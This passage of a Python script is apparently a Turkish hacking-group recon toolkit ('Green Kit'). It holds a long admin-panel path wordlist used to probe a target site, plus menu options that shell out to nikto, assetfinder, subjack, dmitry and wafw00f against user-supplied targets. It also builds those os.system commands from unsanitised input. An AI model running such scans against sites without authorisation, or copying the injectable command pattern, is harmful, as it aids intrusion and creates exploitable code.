                            "/sysadmin.php", "/sysadmins/", "/system_administration/", "/system-administration/",
                            "/typo3/",
                            "/ur-admin/", "/ur-admin.asp", "/ur-admin.html", "/ur-admin.php", "/useradmin/",
                            "/user.asp",
                            "/user.html", "/UserLogin/", "/user.php", "/usuario/", "/usuarios/", "/usuarios//",
                            "/usuarios/login.php", "/utility_login/", "/vadmind/", "/vmailadmin/", "/webadmin/",
                            "/WebAdmin/",
                            "/webadmin/admin.asp", "/webadmin/admin.html", "/webadmin/admin.php", "/webadmin.asp",
                            "/webadmin.html",
                            "/webadmin/index.asp", "/webadmin/index.html", "/webadmin/index.php", "/webadmin/login.asp",
                            "/webadmin/login.html", "/webadmin/login.php", "/webadmin.php", "/webmaster/", "/websvn/",
                            "/wizmysqladmin/", "/wp-admin/", "/wp-login/", "/wplogin/", "/wp-login.php", "/xlogin/",
                            "/yonetici.asp", "/yonetici.html", "/yonetici.php", "/yonetim.asp", "/yonetim.html",
                            "/yonetim.php",
                            "admin1.php", "admin1.html", "admin2.php", "admin2.html", "yonetim.php", "yonetim.html",
                            "yonetici.php",
                            "yonetici.html", "ccms/", "ccms/login.php", "ccms/index.php", "maintenance/", "webmaster/",
                            "adm/",
                            "configuration/", "configure/", "websvn/", "admin/", "admin/account.php",
                            "admin/account.html",
                            "admin/index.php", "admin/index.html", "admin/login.php", "admin/login.html",
                            "admin/home.php",
                            "admin/controlpanel.html", "admin/controlpanel.php", "admin.php", "admin.html",
                            "admin/cp.php",
                            "admin/cp.html", "cp.php", "cp.html", "administrator/", "administrator/index.html",
                            "administrator/index.php", "administrator/login.html", "administrator/login.php",
                            "administrator/account.html", "administrator/account.php", "administrator.php",
                            "administrator.html",
                            "login.php", "login.html", "modelsearch/login.php", "moderator.php", "moderator.html",
                            "moderator/login.php", "moderator/login.html", "moderator/admin.php",
                            "moderator/admin.html",
                            "moderator/", "account.php", "account.html", "controlpanel/", "controlpanel.php",
                            "controlpanel.html",
                            "admincontrol.php", "admincontrol.html", "adminpanel.php", "adminpanel.html", "admin1.asp",
                            "admin2.asp", "yonetim.asp", "yonetici.asp", "admin/account.asp", "admin/index.asp",
                            "admin/login.asp",
                            "admin/home.asp", "admin/controlpanel.asp", "admin.asp", "admin/cp.asp", "cp.asp",
                            "administrator/index.asp", "administrator/login.asp", "administrator/account.asp",
                            "administrator.asp",
                            "login.asp", "modelsearch/login.asp", "moderator.asp", "moderator/login.asp",
                            "moderator/admin.asp",
                            "account.asp", "controlpanel.asp", "admincontrol.asp", "adminpanel.asp", "fileadmin/",
                            "fileadmin.php",
                            "fileadmin.asp", "fileadmin.html", "administration/", "administration.php",
                            "administration.html",
                            "sysadmin.php", "sysadmin.html", "phpmyadmin/", "myadmin/", "sysadmin.asp", "sysadmin/",
                            "ur-admin.asp",
                            "ur-admin.php", "ur-admin.html", "ur-admin/"]

            print(yildiz + " Admin Panel tespit bölümüne hoş geldiniz.")
            try:
                hedef = input(soru_isareti + " Hedef Site (ör:https://google.com/): ")

                sayac = 0
                sayac2 = 0

                for denenecek in denenecekler:
                    sonuc = requests.get(hedef + denenecek)
                    if sonuc.status_code == 200:
                        print(bulundu, hedef + denenecek, "")
                        sayac += 1
                    else:
                        if sayac2 == 0:
                            print(bulunamadi, hedef + denenecek)
                            sayac2 += 1
                        else:
                            print(bulunamadi, hedef + denenecek)
                if sayac == 0:
                    print(yildiz + " Panel bulunamadı.")

            except KeyboardInterrupt:
                print("""
Çıkış Yapılıyor...
                                """)
                exit()

        elif (islem == "5"):
            try:
                while True:
                    print(yildiz + " Zaafiyet Tespiti bölümüne hoş geldiniz.")
                    print(yildiz + "Site linkini http://www.hedefsite.com/ şeklinde giriniz.")
                    link = input(yildiz + " Site Linki: ")
                    os.system("nikto -h " + link)
                    soru = input(soru_isareti + " Başka bir işlem yapmak ister misiniz? (e/h)")
                    if (soru == "e"):
                        continue
                    elif (soru == "h"):
                        print("\n" + arti + " Ana menüye dönülüyor...")
                        time.sleep(2)
                        print(colored(menu, "green"))
                        break
                    else:
                        print("Geçerli bir işlem seçiniz.")
            except KeyboardInterrupt:
                print("""
Çıkış Yapılıyor...
                """)
                exit()

        elif (islem == "6"):

            try:
                while True:
                    print(yildiz + " Alt Alan Adı tespit bölümüne hoş geldiniz.")
                    hedef = input(yildiz + " Hedef Site (ör:google.com): ")
                    os.system("assetfinder --subs-only " + hedef + " | tee subdomains.txt")
                    print(arti + " Tarama başarıyla tamamlandı.")
                    print(arti + " Sonuçlar subdomains.txt dosyasına kaydedildi.")
                    soru = input(soru_isareti + " Başka bir işlem yapmak ister misiniz? (e/h)")
                    if (soru == "e"):
                        continue
                    elif (soru == "h"):
                        print("\n" + arti + " Ana menüye dönülüyor...")
                        time.sleep(2)
                        print(colored(menu, "green"))
                        break
                    else:
                        print("Geçerli bir işlem seçiniz.")

            except KeyboardInterrupt:
                print("""
Çıkış Yapılıyor...
                """)
                exit()

        elif (islem == "7"):
            try:
                while True:
                    print(yildiz + " Subdomain Takeover tespit bölümüne hoş geldiniz.")
                    hedef = input(soru_isareti + " Hedef alt alan adları listesi (ör:subdomains.txt): ")
                    os.system("subjack -w " + hedef + " -t 20 -timeout 30 -v -o takeover.txt")
                    print(arti + " Tarama başarıyla tamamlandı")
                    print(arti + " Sonuçlar takeover.txt dosyasına kaydedildi.")
                    soru = input(soru_isareti + " Başka bir işlem yapmak ister misiniz? (e/h)")
                    if (soru == "e"):
                        continue
                    elif (soru == "h"):
                        print("\n" + arti + " Ana menüye dönülüyor...")
                        time.sleep(2)
                        print(colored(menu, "green"))
                        break
                    else:
                        print("Geçerli bir işlem seçiniz.")
            except KeyboardInterrupt:
                print("""
Çıkış Yapılıyor...
                                """)
                exit()

        elif (islem == "8"):
            try:
                while True:
                    print(yildiz + " Bilgi Toplama bölümüne hoş geldiniz.")
                    print(yildiz + " Site linkini siteadi.com şeklinde giriniz.")
                    link = input(yildiz + " Site Linki: ")
                    os.system("dmitry -iwnse " + link)
                    soru = input(soru_isareti + " Başka bir işlem yapmak ister misiniz? (e/h)")
                    if (soru == "e"):
                        continue
                    elif (soru == "h"):
                        print("\n" + arti + " Ana menüye dönülüyor...")
                        time.sleep(2)
                        print(colored(menu, "green"))
                        break
                    else:
                        print("Geçerli bir işlem seçiniz.")
            except KeyboardInterrupt:
                print("""
Çıkış Yapılıyor...
                                                """)
                exit()

        elif (islem == "9"):
            try:
                while True:
                    print(yildiz + " Firewall Tespiti bölümüne hoş geldiniz.")
                    print(yildiz + "Site linkini http://www.hedefsite.com/ şeklinde giriniz.")
                    link = input(yildiz + " Site Linki: ")
                    os.system("wafw00f -a " + link)
                    soru = input(soru_isareti + " Başka bir işlem yapmak ister misiniz? (e/h)")
                    if (soru == "e"):
                        continue
                    elif (soru == "h"):
                        print("\n" + arti + " Ana menüye dönülüyor...")
                        time.sleep(2)
                        print(colored(menu, "green"))
                        break
                    else:
                        print("Geçerli bir işlem seçiniz.")
            except KeyboardInterrupt:
                print("""
Çıkış Yapılıyor...
                                                """)
                exit()

        elif (islem == "h"):
            print("""
Green Kit V1.0 - Coded by Connec - SafakBey for GreenTeam - TürkHackTeam 
e [exit]: Green Kit'ten çıkış yapar.
h [help]: Yardım bölümünü yazdırır.
clear: Terminali temizler.
menu: Ana menüyü yazdırır. 
            """)

        elif (islem == "e"):
            print(colored(unlem + " Çıkış Yapılıyor...", "red"))
            exit()

        elif (islem == "clear"):
            os.system("clear")

        elif (islem == "menu"):
            print(colored(menu, "green"))

        else:
            print(colored(unlem + " Geçerli bir işlem seçiniz!", "green"))
except KeyboardInterrupt:
    print(arti + """
Çıkış Yapılıyor...""")
    time.sleep(2)
    exit()
